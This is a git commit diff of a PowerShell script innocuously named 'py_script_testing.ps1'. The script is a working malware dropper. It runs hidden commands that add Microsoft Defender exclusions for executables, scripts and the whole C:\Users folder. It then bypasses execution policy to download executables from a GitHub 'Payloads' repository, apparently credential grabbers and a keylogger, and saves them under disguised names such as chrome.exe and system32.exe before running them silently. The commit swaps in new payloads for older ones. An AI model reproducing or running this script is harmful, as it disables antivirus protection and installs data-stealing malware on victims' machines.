257ab00537a2c2b91342de3c7f1e99eeb1167d8c
rude90 <115774095+rude90@users.noreply.github.com>
2023-10-13 18:42:44 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -1,17 +1,18 @@
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
-powershell.exe -w Hidden C:\Users\pdf.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe
+powershell.exe -w Hidden C:\Users\chrome.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/NAZPAT.exe -o C:\Users\system32.exe
 powershell.exe -w Hidden C:\Users\system32.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe
+powershell.exe -w Hidden C:\Users\runtime.exe
 
 
 
